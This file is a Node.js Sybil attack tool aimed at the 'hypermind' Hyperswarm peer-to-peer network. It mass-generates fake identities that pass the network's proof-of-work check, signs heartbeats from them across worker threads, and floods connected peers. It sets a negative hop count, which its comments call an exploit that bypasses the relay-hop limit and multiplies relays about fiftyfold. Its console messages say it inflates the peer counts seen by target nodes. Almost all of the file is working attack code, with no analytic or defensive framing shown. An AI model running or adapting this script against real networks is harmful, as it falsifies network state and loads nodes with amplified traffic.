const Hyperswarm = require("hyperswarm");
const crypto = require("crypto");
const sodium = require("sodium-native");
const { Worker, isMainThread, parentPort, workerData } = require("worker_threads");
const os = require("os");
const fs = require("fs");
const path = require("path");

const CACHE_FILE = path.join(__dirname, 'identities_cache.json');

const TOPIC_NAME = "hypermind-lklynet-v1";
const TOPIC = crypto.createHash("sha256").update(TOPIC_NAME).digest();
const POW_PREFIX = "0000";
const HEARTBEAT_INTERVAL = 5000;
const NEGATIVE_HOPS = -100; // Exploit: bypasses MAX_RELAY_HOPS, causes ~102 relays instead of 2

// Official hypermind.gg node ID for tracking
const OFFICIAL_NODE_ID = "302a300506032b657003210033fb4e4b123acbc07e602718cc14b45defe162fbdef7e287d193b775d401f05e";
let seenOfficialNode = false;

// --- WORKER THREAD LOGIC ---
if (!isMainThread) {
    const { mode } = workerData;

    if (mode === 'generate') {
        // Identity generation mode
        const { count, workerId } = workerData;
        const identities = [];
        const hashOut = Buffer.alloc(sodium.crypto_hash_sha256_BYTES);

        for (let i = 0; i < count; i++) {
            const { publicKey, privateKey } = crypto.generateKeyPairSync("ed25519");
            const id = publicKey.export({ type: "spki", format: "der" }).toString("hex");
            const privateKeyBuffer = privateKey.export({ type: "pkcs8", format: "der" });

            let nonce = 0;
            while (true) {
                const input = Buffer.from(id + nonce);
                sodium.crypto_hash_sha256(hashOut, input);
                if (hashOut[0] === 0 && hashOut[1] === 0) break;
                nonce++;
            }

            identities.push({ id, privateKeyBuffer, nonce, seq: 0 });
            parentPort.postMessage({ type: 'progress', workerId, completed: i + 1, total: count });
        }

        parentPort.postMessage({ type: 'done', identities });
        process.exit(0);

    } else if (mode === 'sign') {
        // Heartbeat signing mode - persistent worker
        const { peers } = workerData;
        
        // Rehydrate private keys once
        const hydratedPeers = peers.map(p => ({
            ...p,
            privateKey: crypto.createPrivateKey({
                key: Buffer.from(p.privateKeyBuffer),
                format: 'der',
                type: 'pkcs8'
            })
        }));

        parentPort.on('message', (msg) => {
            if (msg.type === 'generateHeartbeats') {
                const heartbeats = [];
                for (const peer of hydratedPeers) {
                    peer.seq++;
                    const sig = crypto.sign(null, Buffer.from(`seq:${peer.seq}`), peer.privateKey).toString("hex");
                    heartbeats.push(JSON.stringify({
                        type: "HEARTBEAT",
                        id: peer.id,
                        seq: peer.seq,
                        hops: NEGATIVE_HOPS, // Exploit: -100 < MAX_RELAY_HOPS(2), so it gets relayed ~102 times
                        nonce: peer.nonce,
                        sig,
                    }) + "\n");
                }
                parentPort.postMessage({ type: 'heartbeats', data: heartbeats.join('') });
            }
        });
    }
}

// --- MAIN THREAD LOGIC ---
if (isMainThread) {

class SybilAttacker {
    constructor(numBots = 100) {
        this.numBots = numBots;
        this.fakePeers = [];
        this.signingWorkers = [];
        this.swarm = new Hyperswarm();
        this.connections = new Set();
        this.heartbeatInterval = null;
    }

    loadCachedIdentities() {
        try {
            if (fs.existsSync(CACHE_FILE)) {
                console.log('Loading cached identities...');
                const data = JSON.parse(fs.readFileSync(CACHE_FILE, 'utf8'));
                // Convert base64 back to Buffer
                return data.map(p => ({
                    ...p,
                    privateKeyBuffer: Buffer.from(p.privateKeyBuffer, 'base64')
                }));
            }
        } catch (e) {
            console.log('Cache load failed, generating fresh:', e.message);
        }
        return null;
    }

    saveCachedIdentities() {
        try {
            console.log('Saving identities to cache...');
            // Convert Buffer to base64 for JSON serialization
            const data = this.fakePeers.map(p => ({
                id: p.id,
                privateKeyBuffer: p.privateKeyBuffer.toString('base64'),
                nonce: p.nonce,
                seq: 0
            }));
            fs.writeFileSync(CACHE_FILE, JSON.stringify(data));
            console.log(`Cached ${data.length} identities to ${CACHE_FILE}`);
        } catch (e) {
            console.log('Cache save failed:', e.message);
        }
    }

    async generateIdentitiesParallel() {
        // Try loading from cache first
        const cached = this.loadCachedIdentities();
        if (cached && cached.length >= this.numBots) {
            this.fakePeers = cached.slice(0, this.numBots);
            console.log(`Loaded ${this.fakePeers.length} identities from cache.`);
            return;
        }

        const numCPUs = os.cpus().length;
        const botsPerWorker = Math.floor(this.numBots / numCPUs);
        const remainder = this.numBots % numCPUs;
        
        console.log(`Spawning ${numCPUs} worker threads for PoW/KeyGen...`);

        const workers = [];
        const workerProgress = new Map();
        let totalCompleted = 0;
        let lastPrintedPercent = -1;

        const printProgress = () => {
            const percent = Math.floor((totalCompleted / this.numBots) * 100);
            if (percent !== lastPrintedPercent) {
                lastPrintedPercent = percent;
                process.stdout.write(`\rGenerating identities: ${totalCompleted}/${this.numBots} (${percent}%)`);
            }
        };

        for (let i = 0; i < numCPUs; i++) {
            const count = botsPerWorker + (i < remainder ? 1 : 0);
            if (count === 0) continue;

            const workerId = i;
            workerProgress.set(workerId, 0);

            workers.push(new Promise((resolve, reject) => {
                const worker = new Worker(__filename, {
                    workerData: { mode: 'generate', count, workerId }
                });

                worker.on('message', (msg) => {
                    if (msg.type === 'progress') {
                        const oldProgress = workerProgress.get(msg.workerId) || 0;
                        workerProgress.set(msg.workerId, msg.completed);
                        totalCompleted += (msg.completed - oldProgress);
                        printProgress();
                    } else if (msg.type === 'done') {
                        resolve(msg.identities);
                    }
                });
                worker.on('error', reject);
                worker.on('exit', (code) => {
                    if (code !== 0) reject(new Error(`Worker stopped with exit code ${code}`));
                });
            }));
        }

        const results = await Promise.all(workers);
        console.log('');
        
        this.fakePeers = results.flat();
        console.log(`Generated ${this.fakePeers.length} identities.`);

        // Save to cache for future runs
        this.saveCachedIdentities();
    }

    setupSigningWorkers() {
        const numCPUs = os.cpus().length;
        const peersPerWorker = Math.floor(this.fakePeers.length / numCPUs);
        const remainder = this.fakePeers.length % numCPUs;

        console.log(`Setting up ${numCPUs} persistent signing workers...`);

        let offset = 0;
        for (let i = 0; i < numCPUs; i++) {
            const count = peersPerWorker + (i < remainder ? 1 : 0);
            if (count === 0) continue;

            const peerSlice = this.fakePeers.slice(offset, offset + count);
            offset += count;

            const worker = new Worker(__filename, {
                workerData: { 
                    mode: 'sign', 
                    peers: peerSlice.map(p => ({
                        id: p.id,
                        privateKeyBuffer: p.privateKeyBuffer,
                        nonce: p.nonce,
                        seq: p.seq
                    }))
                }
            });

            worker.setMaxListeners(100);
            
            const sw = {
                worker,
                resolver: null
            };

            // Single persistent listener
            worker.on('message', (msg) => {
                if (msg.type === 'heartbeats' && sw.resolver) {
                    sw.resolver(msg.data);
                    sw.resolver = null;
                }
            });

            this.signingWorkers.push(sw);
        }
    }

    async generateAllHeartbeats() {
        const promises = this.signingWorkers.map((sw) => {
            return new Promise((resolve) => {
                sw.resolver = resolve;
                sw.worker.postMessage({ type: 'generateHeartbeats' });
            });
        });

        const results = await Promise.all(promises);
        return results.join('');
    }

    async start() {
        console.log(`Generating ${this.numBots} fake identities in parallel...`);
        const start = Date.now();
        
        await this.generateIdentitiesParallel();
        this.setupSigningWorkers();
        
        const duration = ((Date.now() - start) / 1000).toFixed(2);
        console.log(`Setup complete in ${duration}s.`);
        console.log("Connecting to swarm...");

        this.swarm.on("connection", (socket) => this.handleConnection(socket));

        const discovery = this.swarm.join(TOPIC);
        await discovery.flushed();

        console.log(`Connected to swarm. Maintaining ${this.numBots} peers`);
        console.log("Attack active. Check target nodes to see inflated count.");
        console.log("Press Ctrl+C to stop the attack.");

        // Single heartbeat loop for all connections
        this.startHeartbeatLoop();
    }

    handleConnection(socket) {
        console.log(`New connection established (${this.connections.size + 1} total)`);
        this.connections.add(socket);

        socket.on("data", (data) => {
            try {
                const msgs = data.toString().split("\n").filter(x => x.trim());
                for (const msgStr of msgs) {
                    const msg = JSON.parse(msgStr);
                    if (msg.id && msg.hops === 0) {
                        if (msg.id === OFFICIAL_NODE_ID) {
                            if (!seenOfficialNode) {
                                console.log(`🌟 OFFICIAL NODE CONNECTED: ${msg.id}`);
                                seenOfficialNode = true;
                            }
                        } else {
                            console.log(`Peer: ${msg.id}`);
                        }
                    }
                }
            } catch (e) {}
        });

        socket.on("close", () => {
            this.connections.delete(socket);
            console.log(`Connection closed (${this.connections.size} remaining)`);
        });

        socket.on("error", () => {
            this.connections.delete(socket);
        });
    }

    startHeartbeatLoop() {
        let isRunning = false;

        const sendHeartbeats = async () => {
            if (this.connections.size === 0) return;
            if (isRunning) {
                console.log('Skipping heartbeat cycle - previous still running');
                return;
            }

            isRunning = true;
            const start = Date.now();
            const allHeartbeats = await this.generateAllHeartbeats();
            const signTime = Date.now() - start;

            for (const socket of this.connections) {
                if (!socket.destroyed) {
                    socket.write(allHeartbeats);
                }
            }

            console.log(`Heartbeat cycle: ${this.fakePeers.length} peers × ${this.connections.size} connections in ${signTime}ms`);
            isRunning = false;
        };

        // Initial send
        sendHeartbeats();

        this.heartbeatInterval = setInterval(sendHeartbeats, HEARTBEAT_INTERVAL);
    }

    stop() {
        console.log("Stopping");

        if (this.heartbeatInterval) {
            clearInterval(this.heartbeatInterval);
        }

        for (const sw of this.signingWorkers) {
            sw.worker.terminate();
        }

        for (const socket of this.connections) {
            socket.destroy();
        }

        this.swarm.destroy();
        console.log("stopped");
    }
}

const numBots = process.argv[2] ? parseInt(process.argv[2]) : 100;

console.log(`Starting Sybil with ${numBots} peers (parallel signing)`);

const attacker = new SybilAttacker(numBots);

process.on("SIGINT", () => {
    attacker.stop();
    process.exit(0);
});

process.on("SIGTERM", () => {
    attacker.stop();
    process.exit(0);
});

attacker.start().catch(console.error);

}
